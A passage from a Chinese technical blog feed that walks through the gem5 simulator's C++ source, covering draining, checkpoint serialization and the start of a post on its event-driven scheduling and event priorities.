</span>&#123;<br>  <span class="hljs-function">std::lock_guard&lt;std::mutex&gt; <span class="hljs-title">lock</span><span class="hljs-params">(globalLock)</span></span>;<br>  _allDrainable.<span class="hljs-built_in">push_back</span>(obj);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">DrainManager::unregisterDrainable</span><span class="hljs-params">(Drainable *obj)</span> </span>&#123;<br>  <span class="hljs-function">std::lock_guard&lt;std::mutex&gt; <span class="hljs-title">lock</span><span class="hljs-params">(globalLock)</span></span>;<br>  <span class="hljs-keyword">auto</span> o = std::<span class="hljs-built_in">find</span>(_allDrainable.<span class="hljs-built_in">begin</span>(), _allDrainable.<span class="hljs-built_in">end</span>(), obj);<br>  _allDrainable.<span class="hljs-built_in">erase</span>(o);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Drainable">Drainable</h3><p>至于 Drainable 类，它是 SimObject 类中的一个基类。Drainable 的所有派生类都是可 Drain 的，<code>drain()</code> 函数要求所有派生类都必须实现，<code>dmDrain()</code> 函数是为 DrainManager 类方便调用 <code>drain()</code> 而实现的。Drainable 类包括了一个指示状态的变量以及指向全局 DrainManager 类的指针（引用）。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Drainable</span> &#123;<br>  <span class="hljs-keyword">friend</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DrainManager</span>;<br>  <span class="hljs-keyword">protected</span>:<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> DrainState <span class="hljs-title">drain</span><span class="hljs-params">()</span> </span>= <span class="hljs-number">0</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">drainResume</span><span class="hljs-params">()</span> </span>&#123;&#125;;<br>  <span class="hljs-keyword">private</span>:<br>    <span class="hljs-comment">/** interface for DrainManager */</span><br>    <span class="hljs-function">DrainState <span class="hljs-title">dmDrain</span><span class="hljs-params">()</span></span>;<br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">dmDrainResume</span><span class="hljs-params">()</span></span>;<br>    <span class="hljs-comment">/** Convenience reference to the global DrainManager */</span><br>    DrainManager &amp;_drainManager;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Current drain state of the object. Needs to be mutable since</span><br><span class="hljs-comment">     * objects need to be able to signal that they have transitioned</span><br><span class="hljs-comment">     * into a Drained state even if the calling method is const.</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">mutable</span> DrainState _drainState;<br>&#125;;<br></code></pre></td></tr></table></figure><p>当一个对象完成 drain 后，调用 <code>signalDrainDone()</code> 函数，该函数会通知 DrainManager 其 drain 工作已完成。若 <code>tryDrain()</code> 函数返回值为 false，那么就需要不停地调用 <code>tryDrain()</code> ，此时模拟仍将继续。直到所有对象完成 drain。此时，DrainManager 会退出模拟循环（<code>exitSimLoop()</code>），开始进行第四步中所说的其他操作。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">signalDrainDone</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123;<br>  <span class="hljs-keyword">switch</span> (_drainState) &#123;<br>    <span class="hljs-keyword">case</span> DrainState::Running:<br>    <span class="hljs-keyword">case</span> DrainState::Drained:<br>    <span class="hljs-keyword">case</span> DrainState::Resuming:<br>      <span class="hljs-keyword">return</span>;<br>    <span class="hljs-keyword">case</span> DrainState::Draining:<br>      _drainState = DrainState::Drained;<br>      _drainManager.<span class="hljs-built_in">signalDrainDone</span>();<br>   <span class="hljs-keyword">return</span>;<br>  &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">DrainManager::signalDrainDone</span><span class="hljs-params">()</span> </span>&#123;<br>  <span class="hljs-built_in">assert</span>(_count &gt; <span class="hljs-number">0</span>);<br>  <span class="hljs-keyword">if</span> (--_count == <span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-built_in">DPRINTF</span>(Drain, <span class="hljs-string">&quot;All %u objects drained..\n&quot;</span>, <span class="hljs-built_in">drainableCount</span>());<br>    <span class="hljs-built_in">exitSimLoop</span>(<span class="hljs-string">&quot;Finished drain&quot;</span>, <span class="hljs-number">0</span>);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>第五步中，要让系统返回正常运行状态。DrainManager 类要使用 <code>DrainManager::resume()</code> 函数，将 drained 系统返回到正常状态：for 循环中让每个对象调用 <code>dmDrainResume()</code> 函数。<code>dmDrainResume()</code> 就是对 <code>drainResume()</code> 的包装。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/** Resume normal simulation in a Drained system. */</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">DrainManager::resume</span><span class="hljs-params">()</span> </span>&#123;<br>  <span class="hljs-comment">// New objects (i.e., objects created while resuming) will</span><br>  <span class="hljs-comment">// inherit the Resuming state from the DrainManager.</span><br>  _state = DrainState::Resuming;<br>  <span class="hljs-keyword">do</span> &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> *obj : _allDrainable) &#123;<br>      <span class="hljs-keyword">if</span> (obj-&gt;<span class="hljs-built_in">drainState</span>() != DrainState::Running) &#123;<br>        <span class="hljs-built_in">assert</span>(obj-&gt;<span class="hljs-built_in">drainState</span>() == DrainState::Drained ||<br>           obj-&gt;<span class="hljs-built_in">drainState</span>() == DrainState::Resuming);<br>        obj-&gt;<span class="hljs-built_in">dmDrainResume</span>();<br>      &#125;<br>    &#125;<br>  &#125; <span class="hljs-keyword">while</span> (!<span class="hljs-built_in">allInState</span>(DrainState::Running));<br>  _state = DrainState::Running;   <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Serialization">Serialization</h2><p><strong>Serialization（序列化）指将对象转换成二进制</strong>，以方便长期保存、网络传递等。而 deserialization（反序列化）就是将二进制转换成对象。当前文提到的 drain 操作完成后，通常会跟上对象的序列化操作，将对象转换成二进制，用作快照（snapshot）保存或切换模型。在 gem5 中，Serializable 类为 SimObject 类提供序列化支持。Serializable 类通常用于创建检查点（Checkpoints）。<strong>所谓检查点其本质上是模拟的快照</strong>。当模拟需要非常长的时间时（几乎总是如此），用户可以使用检查点，在自己感兴趣的时间处加上检查点，以便稍后使用 DerivO3CPU 从该检查点恢复。</p><h3 id="检查点创建与使用"><a href="https://www.gem5.org/documentation/general_docs/checkpoints/">检查点创建与使用</a></h3><p>通常，检查点会保存在新的文件夹目录 cpt.TICKNUMBER，其中 TICKNUMBER 指 要插入的检查点的 tick 时间值。要创建新的检查点，有以下几种方法：</p><ul><li>启动 gem5 模拟器后，执行 m5 的命令插入检查点。</li><li>一个伪指令可以用来创建检查点。例如，可以在应用程序中包含这个pseduo指令，以便当应用程序达到某种状态时创建检查点</li><li>使用 --take-checkpoints 可以周期性的输出检查点，–checkpoint-at-end 用于在模拟后创建检查点</li></ul><p>使用Ruby内存模型创建检查点时，必须使用MOESI锤协议。这是因为检查指向正确的内存状态要求缓存刷新到内存中。这种刷新操作目前仅支持MOESI锤协议。</p><p>从检查点恢复通常可以很容易地从命令行完成:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">build/&lt;ISA&gt;/gem5.debug configs/example/fs.py -r N<br>OR<br>build/&lt;ISA&gt;/gem5.debug configs/example/fs.py --checkpoint-restore=N<br></code></pre></td></tr></table></figure><p>整数N表示检查点编号，通常从1开始递增。</p><h3 id="CheckPointIn">CheckPointIn</h3><p>深入理解序列化的实现离不开对 CheckpointIn 类的剖析。该类主要负责完成检查点的创建与恢复工作。_cptDir 就是检查点保存的目录位置，db 表示 ini 文件。<a href="https://en.wikipedia.org/wiki/INI_file">ini 文件</a>就是由很多 section 组成的初始化文件，其中每个 section 包含有若干 key-value 的 entry。通过 ini 文件以及 IniFile 类，检查点将模拟时的对象保存在了磁盘中，这便是序列化。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">CheckpointIn</span> &#123;<br>  <span class="hljs-keyword">private</span>:<br>    IniFile db;<br>    <span class="hljs-type">const</span> std::string _cptDir;<br>    <span class="hljs-comment">// current directory we&#x27;re serializing into.</span><br>    <span class="hljs-type">static</span> std::string currentDirectory;<br>    <span class="hljs-comment">// Filename for base checkpoint file within directory.</span><br>    <span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-type">char</span> *baseFilename;<br>&#125;;<br></code></pre></td></tr></table></figure><p>IniFile 类详细实现了 ini 文件的读写，section 的查询、访问等，这不是本博客的主题，不在详述。</p><h3 id="Serializable">Serializable</h3><p>任何继承并实现此接口的对象都可以包含在 gem5 的检查点系统中。所有支持序列化的对象都应该继承该类。继承该类对象可大致分为两类：1）真正的 SimObjects（继承了 SimObject 类，SimObject 类继承了 Serializable 类）和 2）未继承 SimObject 类，仅继承 Serializable 类的普通对象。</p><p>SimObjects 可通过 <code>SimObject::serializeAll()</code> 函数自动完成序列化，写入到自己的 sections 中。前文提到，SimObjects 也可以包含其他未继承 SimObject 类的可序列化对象。然而，这些“普通”的可序列化成员不会自动序列化，因为它们没有 <code>SimObject::serializeAll()</code> 函数。因此有这些对象的类在实现时需要主动调用其序列化/反序列化函数，以完成序列化。</p><p>其中，首选方法是使用 <code>serializeSection()</code> 函数，这会将序列化对象放入当前 section（此section 就是 ini 文件中的section） 中的新 subsection。另一种选择是直接调用 <code>serialize()</code> ，它将对象序列化到当前 section，但不推荐使用后者，因为这会导致可能存在的命名冲突。下面代码给出了 Serializable 类中最重要的函数。<code>serialize()</code> 和 <code>unserializa()</code> 函数都需要子类实现。<code>serializeAll()</code> 函数，从后往前（why?）遍历所有的对象，调用 <code>serializeSection()</code> 函数将它们序列化。因此，不应在其他任何地方对 SimObject 对象调用序列化函数；否则，这些对象将被不必要地序列化多次。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* In class SimObject</span><br><span class="hljs-comment">* Create a checkpoint by serializing all SimObjects in the system.*/</span><br><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title">serializeAll</span><span class="hljs-params">(<span class="hljs-type">const</span> std::string &amp;cpt_dir)</span> </span>&#123;<br>  std::ofstream cp;<br>  Serializable::<span class="hljs-built_in">generateCheckpointOut</span>(cpt_dir, cp);<br>  SimObjectList::reverse_iterator ri = simObjectList.<span class="hljs-built_in">rbegin</span>();<br>  SimObjectList::reverse_iterator rend = simObjectList.<span class="hljs-built_in">rend</span>();<br>  <span class="hljs-keyword">for</span> (; ri != rend; ++ri) &#123;<br>    SimObject *obj = *ri;<br>    <span class="hljs-comment">// This works despite name() returning a fully qualified name</span><br>    <span class="hljs-comment">// since we are at the top level.</span><br>    obj-&gt;<span class="hljs-built_in">serializeSection</span>(cp, obj-&gt;<span class="hljs-built_in">name</span>());<br>   &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Serializable</span> &#123;<br>  <span class="hljs-comment">/* Serialize an object</span><br><span class="hljs-comment">   * Output an object&#x27;s state into the current checkpoint section. */</span><br>  <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">serialize</span><span class="hljs-params">(CheckpointOut &amp;cp)</span> <span class="hljs-type">const</span> </span>= <span class="hljs-number">0</span>;<br>    <br>  <span class="hljs-comment">/* Unserialize an object</span><br><span class="hljs-comment">   * Read an object&#x27;s state from the current checkpoint section. */</span><br>  <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">unserialize</span><span class="hljs-params">(CheckpointIn &amp;cp)</span> </span>= <span class="hljs-number">0</span>;<br>  <br>  <span class="hljs-comment">/* Serialize an object into a new section in a checkpoint </span><br><span class="hljs-comment">   * and calls serialize() to serialize the current object into</span><br><span class="hljs-comment">   * the new section. */</span><br>  <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">serializeSection</span><span class="hljs-params">(CheckpointOut &amp;cp, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *name)</span> <span class="hljs-type">const</span></span>;<br>  <span class="hljs-keyword">private</span>:<br>    <span class="hljs-type">static</span> std::stack&lt;std::string&gt; path;<br>&#125;<br></code></pre></td></tr></table></figure><p>注意到 Serializable 类中仅维护了一个路径堆栈 path，实时记录对象所在的位置。下面代码可以看出，当新的 section 被创建后，其名字会被压栈进入到 path 中。ScopedCheckpointSection 类是为命名 section 时更加方便：section 名字便是该对象所在的系统位置。例如，Section1.Section2.Section3 表示对象从内到外处于Section3 Section2 Section1 中。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c++">Serializable::<span class="hljs-built_in">ScopedCheckpointSection</span>(CP &amp;cp, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *name) &#123;<br>  <span class="hljs-built_in">pushName</span>(name);<br>  <span class="hljs-built_in">nameOut</span>(cp);<br>&#125;<br><br><span class="hljs-type">void</span> Serializable::ScopedCheckpointSection::<span class="hljs-built_in">pushName</span>(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *obj_name) &#123;<br>  <span class="hljs-keyword">if</span> (path.<span class="hljs-built_in">empty</span>()) &#123;<br>    path.<span class="hljs-built_in">push</span>(obj_name);<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    path.<span class="hljs-built_in">push</span>(<span class="hljs-built_in">csprintf</span>(<span class="hljs-string">&quot;%s.%s&quot;</span>, path.<span class="hljs-built_in">top</span>(), obj_name));<br>  &#125;<br>  <span class="hljs-built_in">DPRINTF</span>(Checkpoint, <span class="hljs-string">&quot;ScopedCheckpointSection::pushName: %s\n&quot;</span>, obj_name);<br>&#125;<br><br><br><span class="hljs-type">void</span> Serializable::ScopedCheckpointSection::<span class="hljs-built_in">nameOut</span>(CheckpointOut &amp;cp) &#123;<br>  <span class="hljs-built_in">DPRINTF</span>(Checkpoint, <span class="hljs-string">&quot;ScopedCheckpointSection::nameOut: %s\n&quot;</span>,<br>          Serializable::<span class="hljs-built_in">currentSection</span>());<br>  cp &lt;&lt; <span class="hljs-string">&quot;\n[&quot;</span> &lt;&lt; Serializable::<span class="hljs-built_in">currentSection</span>() &lt;&lt; <span class="hljs-string">&quot;]\n&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c++">Serializable::ScopedCheckpointSection::~<span class="hljs-built_in">ScopedCheckpointSection</span>() &#123;<br>    <span class="hljs-built_in">DPRINTF</span>(Checkpoint, <span class="hljs-string">&quot;Popping: %s\n&quot;</span>, path.<span class="hljs-built_in">top</span>());<br>    path.<span class="hljs-built_in">pop</span>();<br>&#125;<br></code></pre></td></tr></table></figure><p>下面给出创建检查点的函数。给定了文件目录名后，创建文件夹和 ini 文件，然后输出检查点即可。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Serializable::generateCheckpointOut</span><span class="hljs-params">(<span class="hljs-type">const</span> std::string &amp;cpt_dir,</span></span><br><span class="hljs-params"><span class="hljs-function">        std::ofstream &amp;outstream)</span> </span>&#123;<br>  std::string dir = CheckpointIn::<span class="hljs-built_in">setDir</span>(cpt_dir);<br>  <span class="hljs-keyword">if</span> (<span class="hljs-built_in">mkdir</span>(dir.<span class="hljs-built_in">c_str</span>(), <span class="hljs-number">0775</span>) == <span class="hljs-number">-1</span> &amp;&amp; errno != EEXIST)<br>    <span class="hljs-built_in">fatal</span>(<span class="hljs-string">&quot;couldn&#x27;t mkdir %s\n&quot;</span>, dir);<br><br>  std::string cpt_file = dir + CheckpointIn::baseFilename;<br>  outstream = std::<span class="hljs-built_in">ofstream</span>(cpt_file.<span class="hljs-built_in">c_str</span>());<br>  <span class="hljs-type">time_t</span> t = <span class="hljs-built_in">time</span>(<span class="hljs-literal">NULL</span>);<br>  <span class="hljs-keyword">if</span> (!outstream)<br>    <span class="hljs-built_in">fatal</span>(<span class="hljs-string">&quot;Unable to open file %s for writing\n&quot;</span>, cpt_file.<span class="hljs-built_in">c_str</span>());<br>  outstream &lt;&lt; <span class="hljs-string">&quot;## checkpoint generated: &quot;</span> &lt;&lt; <span class="hljs-built_in">ctime</span>(&amp;t);<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Cpp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Cpp</tag>
      
      <tag>gem5</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>深入理解 Gem5 之一</title>
    <link href="/2022/02/24/2022-2-24-gem5-1/"/>
    <url>/2022/02/24/2022-2-24-gem5-1/</url>
    
    <content type="html"><![CDATA[<h1>深入理解 Gem5 之一</h1><h2 id="前言">前言</h2><p>近期研究需要，我开始研究 <a href="https://www.gem5.org/">gem5</a> 模拟器的底层实现 。gem5 模拟器是一款模块化的计算机系统架构研究平台，可用于研究系统级架构、处理器微架构。gem5 是一个具有开放治理模型的社区主导项目，最初是为学术界的计算机体系结构研究而构想的，目前已发展为学术界、工业研究和教学中的计算机系统设计。</p><p>根据 gem5 的 <a href="https://dl.acm.org/doi/10.1145/2024716.2024718">paper</a>，gem5 框架融合了 <a href="https://ieeexplore.ieee.org/abstract/document/1677503">M5</a> 和 <a href="https://dl.acm.org/doi/abs/10.1145/1105734.1105747">GEMS</a> 两者的实现。其中 M5 提供高度可配置的仿真框架，包含了多个 ISA 和多种 CPU 模型；而 GEMS 的详细而灵活的内存系统提供了对多个缓存一致性协议和互连模型的支持。目前，gem5 支持大多数商业 ISA（ARM、ALPHA、MIPS、Power、SPARC 和 x86），包括在其中三个（ARM、ALPHA 和 x86）上 booting Linux。</p><p>该项目是许多学术和工业机构共同努力的结果，包括 AMD、ARM、HP、MIPS、普林斯顿大学、麻省理工学院以及密歇根大学、德克萨斯大学和威斯康星大学。在过去的十年中，M5 和 GEMS 已在数百种出版物中使用，并已被下载数万次。 gem5 项目上的高水平协作，再加上组件部分的先前成功和类似 BSD 的自由许可证，使 gem5 成为一个有价值的全系统仿真工具。</p><p>在本博客中，我将探讨如何创建、调度事件，并深入理解背后的原理。</p><h2 id="创建一个简单的事件"><a href="https://www.gem5.org/documentation/learning_gem5/part2/events/">创建一个简单的事件</a></h2><p>gem5 是一个事件驱动（Event-driven）的模拟器。在事件驱动模型中，每个事件（Event）都有一个回调函数用于处理事件。</p><p>下面以 HelloObject 类代码为例，在代码中添加一个事件触发时执行的新函数 <code>processEvent()</code>。此函数必须不带参数并且不返回任何内容。然后，添加一个 EventFunctionWrapper 类对象 event，并在构造函数中包装 <code>processEvent()</code>。最后，添加了一个 <code>startup()</code> 函数，其中使用 <code>schedule()</code> 函数开始调度事件，即让该事件安排在未来的某个时刻被触发（事件驱动的模拟不允许事件在过去执行）。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloObject</span> : <span class="hljs-keyword">public</span> SimObject &#123;<br>  <span class="hljs-keyword">private</span>:<br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">processEvent</span><span class="hljs-params">()</span></span>;<br>    EventFunctionWrapper event;<br>  <span class="hljs-keyword">public</span>:<br>    <span class="hljs-built_in">HelloObject</span>(HelloObjectParams *p);<br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">startup</span><span class="hljs-params">()</span></span>;<br>&#125;;<br><br>HelloObject::<span class="hljs-built_in">HelloObject</span>(HelloObjectParams *params)<br>  : <span class="hljs-built_in">SimObject</span>(params), <span class="hljs-built_in">event</span>([<span class="hljs-keyword">this</span>]&#123;<span class="hljs-built_in">processEvent</span>();&#125;, <span class="hljs-built_in">name</span>()) &#123;<br>    <span class="hljs-built_in">DPRINTF</span>(Hello, <span class="hljs-string">&quot;Created the hello object\n&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">HelloObject::startup</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-built_in">schedule</span>(event, <span class="hljs-number">100</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">HelloObject::processEvent</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-built_in">DPRINTF</span>(Hello, <span class="hljs-string">&quot;Hello world! Processing the event!\n&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>上面的代码中，事件会在第 100 个 tick 时被触发。通常，需使用 <code>curTick()</code> 加<strong>时间偏移</strong>来确定事件触发的时间。但在这一简单示例中，开始模拟的函数（即 Python 配置文件中调用 <code>simulate()</code> 函数） 是以 tick = 0 的原点开始执行的，因此这里的 <code>startup()</code> 可以显式地标明要调度的时间点。</p><p>当运行 gem5 模拟器后，会得到如下输出，具体如何运行不是本博客的重点，感兴趣的读者可参考<a href="https://www.gem5.org/documentation/learning_gem5/part2/helloobject/">官方文档</a>运行。从下面的输出信息可知，我们实现了在 100 tick 时执行 <code>processEvent()</code> 函数。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">gem5</span> Simulator System.  http://gem5.org<br><span class="hljs-attribute">gem5</span> is copyrighted software; use the --copyright option for details.<br><br><span class="hljs-attribute">gem5</span> compiled Jan  <span class="hljs-number">4</span> <span class="hljs-number">2017</span> <span class="hljs-number">11</span>:<span class="hljs-number">01</span>:<span class="hljs-number">46</span><br><span class="hljs-attribute">gem5</span> started Jan  <span class="hljs-number">4</span> <span class="hljs-number">2017</span> <span class="hljs-number">13</span>:<span class="hljs-number">41</span>:<span class="hljs-number">38</span><br><span class="hljs-attribute">gem5</span> executing <span class="hljs-literal">on</span> chinook, pid <span class="hljs-number">1834</span><br><span class="hljs-attribute">command</span> line: build/X86/gem5.opt --debug-flags=Hello configs/learning_gem5/part2/run_hello.py<br><br><span class="hljs-attribute">Global</span> frequency set at <span class="hljs-number">1000000000000</span> ticks per second<br>      <span class="hljs-attribute">0</span>: hello: Created the hello object<br><span class="hljs-attribute">Beginning</span> simulation!<br><span class="hljs-attribute">info</span>: Entering event queue @ <span class="hljs-number">0</span>.  Starting simulation...<br>    <span class="hljs-attribute">100</span>: hello: Hello world! Processing the event!<br><span class="hljs-attribute">Exiting</span> @ tick <span class="hljs-number">18446744073709551615</span> because simulate() limit reached<br></code></pre></td></tr></table></figure><p>当然，<code>processEvent()</code> 也可以很复杂，甚至在执行 <code>processEvent()</code> 时再加入一个新的事件等待被触发：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">HelloObject::processEvent</span><span class="hljs-params">()</span> </span>&#123;<br>    timesLeft--;<br>    <span class="hljs-built_in">DPRINTF</span>(HelloExample, <span class="hljs-string">&quot;Hello world! Processing the event! %d left\n&quot;</span>, timesLeft);<br>    <span class="hljs-keyword">if</span> (timesLeft &lt;= <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">DPRINTF</span>(HelloExample, <span class="hljs-string">&quot;Done firing!\n&quot;</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">schedule</span>(event, <span class="hljs-built_in">curTick</span>() + latency);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>上面代码中，在 timesleft 还未小于 0 时，<code>processEvent()</code> 函数每次打印出信息后，都会再次调用 <code>schedule()</code> 函数增加一个事件。注意，此处使用的 <code>schedule()</code> 函数 就利用了 <code>curTick()</code> 生成时间偏移量，进而指定了事件被调度的时间。</p><hr><p>接下来，我会带领大家深入分析一下 gem5 的事件驱动原理，以及其代码实现细节。</p><h2 id="EventBase-类">EventBase 类</h2><p>Gem5 是一个事件驱动的模拟器。因此，事件（Event）是模拟器的基本调度、执行单位，是一个非常重要的核心概念。事件可以理解为一系列改变系统状态的行为，包括但不限于对内存的读写、数据包的发送和到达等。模拟器整个的模拟过程就是对所有事件创建、调度、执行和终止的过程。从技术上讲，事件是由特殊的回调函数和一组状态信息位域实现的。对该事件的执行本质就是执行事件内的回调函数。本小节重点介绍<strong>事件的公共父类——EventBase 类，其内部定义了很多类的静态常量，方便事件之间共享标志位和优先级等定义。</strong></p><h3 id="优先级">优先级</h3><p>EventBase 类定义的静态常量中，很大一部分是事件优先级（Priority）。这是用于区分在同一 cycle 中事件被处理的先后顺序的重要方式，事件包括 CPU 切换上下文、延迟写、DVFS 更新等。值得注意的是，优先级数值越小，事件的优先级越高。大多数事件在调度时都使用默认的优先级。</p><table><thead><tr><th>事件优先级</th><th>描述</th><th>优先级</th></tr></thead><tbody><tr><td>Debug_Enable_Pri</td><td>调试启动的优先级，用于追踪可能 cycle 动作</td><td>-101</td></tr><tr><td>Debug_Break_Pri</td><td>断点的优先级，应该非常高否则会丢失信息</td><td>-100</td></tr><tr><td>CPU_Switch_Pri</td><td>CPU 上下文切换优先级，切换需要先完成再处理其他事件</td><td>-31</td></tr><tr><td>Delayed_Writeback_Pri</td><td>延迟写回，在常规写回之前</td><td>-1</td></tr><tr><td>Default_Pri</td><td>默认的优先级</td><td>0</td></tr><tr><td>DVFS_Update_Pri</td><td>DVFS 更新事件，会将所有相关的状态dump 